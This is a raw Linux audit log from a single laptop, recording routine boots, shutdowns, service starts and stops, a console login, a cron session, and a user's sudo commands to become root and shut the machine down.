type=USER_END msg=audit(1789146715.379:75): pid=953 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789146715.379:76): pid=953 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789146818.907:77): pid=964 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789146818.907:78): pid=964 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/var/log" cmd="su" exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789146818.907:79): pid=964 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789146818.907:80): pid=964 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_AUTH msg=audit(1789146818.911:81): pid=966 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_rootok acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=/dev/pts/0 res=success'UID="root" AUID="Tom"
type=USER_ACCT msg=audit(1789146818.911:82): pid=966 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=/dev/pts/0 res=success'UID="root" AUID="Tom"
type=CRED_ACQ msg=audit(1789146818.911:83): pid=966 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_rootok acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=/dev/pts/0 res=success'UID="root" AUID="Tom"
type=USER_START msg=audit(1789146818.915:84): pid=966 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=/dev/pts/0 res=success'UID="root" AUID="Tom"
type=USER_END msg=audit(1789146839.570:85): pid=966 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=/dev/pts/0 res=success'UID="root" AUID="Tom"
type=CRED_DISP msg=audit(1789146839.570:86): pid=966 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_rootok acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=/dev/pts/0 res=success'UID="root" AUID="Tom"
type=USER_END msg=audit(1789146839.570:87): pid=964 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789146839.570:88): pid=964 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789146867.406:89): pid=975 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789146867.406:90): pid=975 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=73687574646F776E202D68206E6F77 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789146867.406:91): pid=975 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789146867.406:92): pid=975 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789146867.430:93): pid=975 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789146867.430:94): pid=975 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SERVICE_STOP msg=audit(1789146867.470:95): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.474:96): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.478:97): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.490:98): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-random-seed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.530:99): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.582:100): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789146867.598:101): prog-id=9 op=UNLOAD
type=SERVICE_STOP msg=audit(1789146867.606:102): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.610:103): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.610:104): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.626:105): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-binfmt comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_SHUTDOWN msg=audit(1789146867.634:106): pid=996 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789146867.654:107): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=DAEMON_END msg=audit(1789146867.662:4098): op=terminate auid=0 uid=0 ses=4294967295 pid=1 subj=unconfined res=successAUID="root" UID="root"
type=DAEMON_START msg=audit(1789156924.754:9125): op=start ver=3.0.9 format=enriched kernel=6.1.0-49-amd64 auid=4294967295 pid=472 uid=0 ses=4294967295 subj=unconfined  res=successAUID="unset" UID="root"
type=SERVICE_START msg=audit(1789156924.771:13): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timesyncd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CONFIG_CHANGE msg=audit(1789156924.815:14): op=set audit_backlog_limit=8192 old=64 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789156924.815:14): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffe3f3a9070 a2=3c a3=0 items=0 ppid=479 pid=504 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789156924.815:14): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789156924.815:15): op=set audit_failure=1 old=1 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789156924.815:15): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffe3f3a9070 a2=3c a3=0 items=0 ppid=479 pid=504 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789156924.815:15): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789156924.815:16): op=set audit_backlog_wait_time=60000 old=15000 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789156924.815:16): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffe3f3a9070 a2=3c a3=0 items=0 ppid=479 pid=504 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789156924.815:16): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=SERVICE_START msg=audit(1789156924.815:17): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_BOOT msg=audit(1789156924.835:18): pid=516 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156924.843:19): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156924.851:20): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789156924.855:21): prog-id=9 op=LOAD
type=BPF msg=audit(1789156924.855:22): prog-id=10 op=LOAD
type=BPF msg=audit(1789156924.855:23): prog-id=11 op=LOAD
type=SERVICE_START msg=audit(1789156924.883:24): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156924.935:25): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156924.967:26): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=networking comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156924.983:27): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156924.983:28): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156928.339:29): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789156928.339:30): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156928.343:31): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_RUNLEVEL msg=audit(1789156928.355:32): pid=633 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='old-level=N new-level=5 comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789156928.355:33): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789156928.355:34): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789157078.732:35): pid=609 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789157078.732:36): pid=609 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789157078.732:37): pid=609 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=tty1 old-ses=4294967295 ses=1 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789157078.732:37): arch=c000003e syscall=1 success=yes exit=4 a0=3 a1=7fffa28cad20 a2=4 a3=7fffa28caa34 items=0 ppid=1 pid=609 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="login" exe="/usr/bin/login" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789157078.732:37): proctitle=2F62696E2F6C6F67696E002D70002D2D
type=SERVICE_START msg=audit(1789157078.796:38): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789157078.800:39): pid=763 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789157078.800:40): pid=763 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789157078.800:41): pid=763 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=(none) old-ses=4294967295 ses=2 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789157078.800:41): arch=c000003e syscall=1 success=yes exit=4 a0=7 a1=7ffc100cd9d0 a2=4 a3=7ffc100cd6e4 items=0 ppid=1 pid=763 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=2 comm="(systemd)" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789157078.800:41): proctitle="(systemd)"
type=USER_START msg=audit(1789157078.804:42): pid=763 uid=0 auid=1000 ses=2 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_selinux,pam_loginuid,pam_limits,pam_permit,pam_unix,pam_keyinit,pam_systemd acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="Tom"
type=SERVICE_START msg=audit(1789157078.928:43): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_START msg=audit(1789157078.936:44): pid=609 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_loginuid,pam_selinux,pam_env,pam_env,pam_limits,pam_lastlog,pam_mail,pam_keyinit,pam_permit,pam_unix,pam_systemd acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=CRED_ACQ msg=audit(1789157078.936:45): pid=609 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=USER_LOGIN msg=audit(1789157078.936:46): pid=609 uid=0 auid=1000 ses=1 subj=unconfined msg='op=login acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=USER_ACCT msg=audit(1789157821.719:47): pid=799 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789157821.719:48): pid=799 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789157821.719:49): pid=799 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=3 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789157821.719:49): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffcdd724d30 a2=1 a3=7ffcdd724a47 items=0 ppid=533 pid=799 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=3 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789157821.719:49): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789157821.719:50): pid=799 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789157821.723:51): pid=800 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789157821.727:52): pid=799 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789157821.727:53): pid=799 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SERVICE_START msg=audit(1789157847.495:54): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-tmpfiles-clean comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789157847.495:55): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-tmpfiles-clean comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789158023.831:56): pid=808 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789158023.831:57): pid=808 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789158023.831:58): pid=808 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=73687574646F776E202D68206E6F77 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789158023.831:59): pid=808 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789158023.831:60): pid=808 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789158023.855:61): pid=808 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789158023.855:62): pid=808 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SERVICE_STOP msg=audit(1789158023.883:63): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158023.883:64): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158023.887:65): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158023.907:66): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158023.967:67): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-random-seed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158023.987:68): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158023.999:69): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158024.007:70): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789158024.011:71): prog-id=9 op=UNLOAD
type=SERVICE_STOP msg=audit(1789158024.015:72): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_SHUTDOWN msg=audit(1789158024.051:73): pid=835 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158024.051:74): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timesyncd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789158024.063:75): prog-id=8 op=UNLOAD
type=SERVICE_STOP msg=audit(1789158024.067:76): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-binfmt comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789158024.071:77): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=DAEMON_END msg=audit(1789158024.074:9126): op=terminate auid=0 uid=0 ses=4294967295 pid=1 subj=unconfined res=successAUID="root" UID="root"
type=DAEMON_START msg=audit(1789320256.500:4484): op=start ver=3.0.9 format=enriched kernel=6.1.0-49-amd64 auid=4294967295 pid=475 uid=0 ses=4294967295 subj=unconfined  res=successAUID="unset" UID="root"
type=SERVICE_START msg=audit(1789320256.527:13): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timesyncd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CONFIG_CHANGE msg=audit(1789320256.551:14): op=set audit_backlog_limit=8192 old=64 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
